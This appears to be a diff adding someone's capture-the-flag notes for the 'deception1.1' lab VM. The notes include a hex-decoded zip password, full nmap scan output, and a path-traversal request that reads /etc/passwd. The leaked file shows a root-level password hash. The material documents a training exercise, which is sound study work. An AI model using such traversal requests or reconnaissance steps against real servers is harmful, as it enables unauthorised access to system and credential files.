@@ -1,0 +1,80 @@
+Pass to unzip: 646563657074696f6e312e31  ---> from HEX: deception1.1
+
+
+
+hack@kali:~/CTF/haclabs:deception1.1$ nmap -A -p- 192.168.1.68
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-23 13:00 CET
+Nmap scan report for haclabs.homenet.telecomitalia.it (192.168.1.68)
+Host is up (0.0011s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 75:b3:93:d4:f1:02:30:bf:35:ea:12:4e:3b:e7:fa:4a (RSA)
+|   256 f9:8c:43:5b:45:7d:fe:84:b1:f5:93:a3:68:bb:ce:84 (ECDSA)
+|_  256 77:2a:33:3e:8f:2b:65:a5:f3:df:b5:bc:58:4a:f4:8e (ED25519)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 18.64 seconds
+
+
+
+Insert:
+user: sadsad
+pass: asasASA6???
+
+redirect --> <script>alert('0000flagflagflagflag.php')</script>Password is strong , contains all 4 things(uppercase,lowercase,number,specialchars) with flag=1 </pre>
+
+
+Flag=1
+http://192.168.1.68/00001111.php  --> <script>alert('find password.txt')</script>
+
+<html>
+<body>
+
+<!-- use ?page= --!>
+
+</body>
+</html>
+
+
+http://192.168.1.68/00001111.php?page=/../../../../etc/passwd
+
+haclabs:$6$E0Wz59PNTRyh.NJv$E4cKcQXD6lZEhmK4U.nbutUrw1pCQmqRppOThOp/AJorXoDsj2RGhWNiPl1GTwHiVvfExzYhS70QFNgnv.Z7/.:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+avahi:x:107:117:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
+saned:x:108:118::/var/lib/saned:/usr/sbin/nologin
+colord:x:109:119:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+hplip:x:110:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+yash:x:1000:1000:yash,,,:/home/yash:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+
+
+
